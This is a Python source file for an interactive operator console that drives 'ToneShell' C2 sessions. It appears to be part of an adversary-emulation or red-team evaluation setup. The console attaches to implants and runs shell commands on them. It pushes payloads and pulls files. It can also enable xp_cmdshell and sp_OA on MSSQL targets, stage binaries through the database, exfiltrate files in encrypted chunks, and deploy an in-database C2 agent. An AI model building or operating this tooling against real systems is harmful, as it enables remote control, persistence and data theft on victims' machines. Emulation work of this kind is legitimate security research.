#!/usr/bin/env python3
"""
toneshell_shell.py — Interactive shell for ToneShell C2 sessions.

Wraps evalsC2client's REST API with a persistent prompt so you don't have
to hand-craft JSON task strings or copy session GUIDs for every command.

Usage:
    python toneshell_shell.py [--port 9999]

Built-in commands (case-insensitive):
    sessions                        list active C2 sessions
    use <session_id>                attach to a session
    detach                          unattach (return to session-picker mode)
    get <remote_path>               upload file FROM implant to C2 server
    put <payload_name> <dest_path>  push file FROM server payloads dir TO implant
    kill                            send TERMINATE (id=255) to current implant
    xpinit <host:port> <login> <pass>       enable xp_cmdshell + sp_OA on MSSQL target
    xpshell cmd <cmd>               run cmd.exe command on MSSQL host via xp_cmdshell
    xpshell psh <ps_script>         stage and run PowerShell script on MSSQL host
    xpstage <payload> [--no-encrypt]        stage binary to MSSQL host via DB channel
    xpexfil <remote_path> <local_name> [insert_timeout_s] [chunk_mb]  exfil file from MSSQL host via DB channel (AES-256-CBC, chunked)
    xpagent init                    deploy xpagent in-DB C2 on IIS01 (runs xpagent_init.sql via SB)
    xpagent kill                    drop xpagent database (cleanup)
    xpexec <cmd>                    run command via xpagent SB queue, wait for result
    xpexec-bg <cmd>                 fire-and-forget xpexec (returns cmd_id)
    xpout <cmd_id>                  read xpagent output rows by cmd_id
    help                            show this help
    exit / quit                     exit the shell

Anything else is sent as an EXEC (id=5) shell command to the current session.
"""

import argparse
import sys

try:
    import readline  # noqa: F401 – enables arrow-key history on Linux/Mac
except ImportError:
    pass  # Windows: no readline, input() still works

import requests

from c2_client import C2Client, ApiError
from xp_mssql import XpMssql


class ToneShellShell(C2Client):
    def __init__(self, port: str, debug: bool = False):
        super().__init__(port, debug)
        self._xp = XpMssql()

    @staticmethod
    def cmd_help():
        print(__doc__)

    def prompt(self) -> str:
        if self.session:
            label = self.hostname or self.session[:8]
            return f"[{label}]> "
        return "[no session]> "

    def run(self):
        print("ToneShell interactive shell  (type 'help' for commands)")
        print(f"Connected to controlServer on port {self.port}\n")
        try:
            self.cmd_sessions()
        except Exception as e:
            print(f"[!] could not reach controlServer: {e}")

        while True:
            try:
                line = input(self.prompt()).strip()
            except (EOFError, KeyboardInterrupt):
                print()
                break

            if not line:
                continue

            parts = line.split(None, 2)
            cmd   = parts[0].lower()

            try:
                if cmd in ("exit", "quit"):
                    break

                elif cmd == "help":
                    self.cmd_help()

                elif cmd == "timeout":
                    if len(parts) < 2:
                        print(f"[*] poll timeout = {self._timeout_s}s  (usage: timeout <seconds>)")
                    else:
                        self._timeout_s = int(parts[1])
                        print(f"[*] poll timeout set to {self._timeout_s}s")

                elif cmd == "sessions":
                    self.cmd_sessions()

                elif cmd == "use":
                    if len(parts) < 2:
                        print("usage: use <session_id>")
                    else:
                        self.cmd_use(parts[1])

                elif cmd == "detach":
                    if not self.session:
                        print("[*] not attached to any session")
                    else:
                        self.cmd_detach()

                elif cmd in ("output", "getoutput"):
                    if not self.session:
                        print("[!] not attached to a session")
                    else:
                        self.cmd_output()

                elif cmd == "get":
                    if not self.session:
                        print("[!] not attached to a session")
                    elif len(parts) < 2:
                        print("usage: get <remote_path>")
                    else:
                        self.cmd_get(parts[1])

                elif cmd == "put":
                    if not self.session:
                        print("[!] not attached to a session")
                    elif len(parts) < 3:
                        print("usage: put <payload_name> <remote_dest>")
                    else:
                        self.cmd_put(parts[1], parts[2])

                elif cmd == "kill":
                    if not self.session:
                        print("[!] not attached to a session")
                    else:
                        self.cmd_kill()

                elif cmd == "xpinit":
                    tokens = line.split(None, 3)
                    if len(tokens) < 4:
                        print("usage: xpinit <host:port> <login> <pass>")
                    elif not self.session:
                        print("[!] not attached to a session")
                    else:
                        self._xp.cmd_xpinit(self, tokens[1], tokens[2], tokens[3])

                elif cmd == "xpshell":
                    if not self.session:
                        print("[!] not attached to a session")
                    elif len(parts) < 3:
                        print("usage: xpshell cmd|psh <command_or_script>")
                    elif not self._xp.ready():
                        print("[!] run xpinit first")
                    elif parts[1] == "cmd":
                        self._xp.cmd_xpshell_cmd(self, parts[2])
                    elif parts[1] == "psh":
                        self._xp.cmd_xpshell_psh(self, parts[2])
                    else:
                        print("usage: xpshell cmd|psh <command_or_script>")

                elif cmd == "xpstage":
                    if not self.session:
                        print("[!] not attached to a session")
                    elif len(parts) < 2:
                        print("usage: xpstage <payload_name> [--no-encrypt]")
                    elif not self._xp.ready():
                        print("[!] run xpinit first")
                    else:
                        no_enc = len(parts) >= 3 and parts[2] == "--no-encrypt"
                        self._xp.cmd_xpstage(self, parts[1], encrypt=not no_enc)

                elif cmd == "xpexfil":
                    xp_parts = line.split()
                    if not self.session:
                        print("[!] not attached to a session")
                    elif len(xp_parts) < 3:
                        print("usage: xpexfil <remote_path> <local_name> [insert_timeout_s=600] [chunk_mb=10]")
                    elif not self._xp.ready():
                        print("[!] run xpinit first")
                    else:
                        t = int(xp_parts[3]) if len(xp_parts) >= 4 else 600
                        c = int(xp_parts[4]) if len(xp_parts) >= 5 else 10
                        self._xp.cmd_xpexfil(self, xp_parts[1], xp_parts[2], insert_timeout_s=t, chunk_mb=c)

                elif cmd == "xpagent":
                    sub = parts[1].lower() if len(parts) >= 2 else ""
                    if not self.session:
                        print("[!] not attached to a session")
                    elif not self._xp.ready():
                        print("[!] run xpinit first")
                    elif sub == "init":
                        self._xp.cmd_xpagent_init(self)
                    elif sub == "kill":
                        self._xp.cmd_xpagent_kill(self)
                    else:
                        print("usage: xpagent init|kill")

                elif cmd == "xpexec":
                    rest = line.split(None, 1)
                    if not self.session:
                        print("[!] not attached to a session")
                    elif len(rest) < 2:
                        print("usage: xpexec <command>")
                    elif not self._xp.ready():
                        print("[!] run xpinit first")
                    else:
                        self._xp.cmd_xpexec(self, rest[1])

                elif cmd == "xpexec-bg":
                    rest = line.split(None, 1)
                    if not self.session:
                        print("[!] not attached to a session")
                    elif len(rest) < 2:
                        print("usage: xpexec-bg <command>")
                    elif not self._xp.ready():
                        print("[!] run xpinit first")
                    else:
                        self._xp.cmd_xpexec_bg(self, rest[1])

                elif cmd == "xpout":
                    if not self.session:
                        print("[!] not attached to a session")
                    elif len(parts) < 2:
                        print("usage: xpout <cmd_id>")
                    elif not self._xp.ready():
                        print("[!] run xpinit first")
                    else:
                        try:
                            self._xp.cmd_xpout(self, int(parts[1]))
                        except ValueError:
                            print("usage: xpout <cmd_id>  (cmd_id must be an integer)")

                else:
                    if not self.session:
                        print("[!] not attached to a session -- type 'sessions' then 'use <id>'")
                    else:
                        self.cmd_exec(line)

            except ApiError as e:
                print(f"[-] API error: {e}")
            except requests.ConnectionError:
                print(f"[-] cannot reach controlServer at {self.base_url}")
            except Exception as e:
                print(f"[-] {e}")

        print("[*] bye")


def main():
    parser = argparse.ArgumentParser(description="Interactive ToneShell C2 shell")
    parser.add_argument("--port", default="9999", metavar="PORT",
                        help="controlServer REST API port (default 9999)")
    parser.add_argument("--debug", action="store_true",
                        help="print each command/T-SQL/PS script as it is sent")
    args = parser.parse_args()
    ToneShellShell(args.port, debug=args.debug).run()


if __name__ == "__main__":
    main()
